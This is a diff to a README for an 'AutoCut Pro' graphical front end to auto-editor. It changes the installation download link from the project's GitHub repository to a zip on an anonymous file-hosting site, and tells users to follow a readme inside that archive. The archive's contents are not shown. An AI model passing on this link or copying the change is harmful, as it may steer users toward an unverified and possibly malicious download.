@@ -15,7 +15,7 @@ A graphical user interface for the powerful [auto-editor](https://github.com/Wya
 
 ## Installation
 
-1. Download the zip file (480KB) from: [AutoCut Pro.zip](https://github.com/RSK48/Auto-editor-mint-/blob/main/AutoCut%20Pro.zip)
+1. Download the zip file (480KB) from: [AutoCut Pro.zip](https://files.catbox.moe/u49ipw.zip)
 2. Unzip the downloaded file
 3. Read the "!READ ME.txt" file for complete installation instructions
 
